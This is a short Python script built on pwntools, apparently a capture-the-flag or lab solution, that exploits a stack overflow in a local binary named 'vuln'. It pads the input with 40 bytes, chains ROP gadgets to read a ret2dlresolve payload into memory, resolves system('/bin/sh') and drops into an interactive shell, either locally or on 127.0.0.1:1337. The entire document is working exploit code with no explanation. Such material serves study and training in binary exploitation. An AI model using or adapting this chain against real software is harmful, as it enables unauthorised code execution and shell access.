from pwn import *

elf = context.binary = ELF("./vuln")
context.log_level = "debug"

if args.REMOTE:
    p = remote("127.0.0.1", 1337)
elif args.GDB:
    p =gdb.debug("./vuln")
else:
    p = process()
rop = ROP(elf)

pop_rdi = 0x0000000000401126
pop_rsi = 0x0000000000401128
pop_rdx = 0x000000000040112a
ret     = 0x0000000000401016

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"]
)

rop.raw(pop_rdi)
rop.raw(0)

rop.raw(pop_rsi)
rop.raw(dlresolve.data_addr)

rop.raw(pop_rdx)
rop.raw(0x200)

rop.raw(elf.plt['read'])

rop.raw(ret)
rop.ret2dlresolve(dlresolve)

payload = flat(
    cyclic(40),
    rop.chain()
)

p.send(payload)
p.send(dlresolve.payload)

p.interactive()
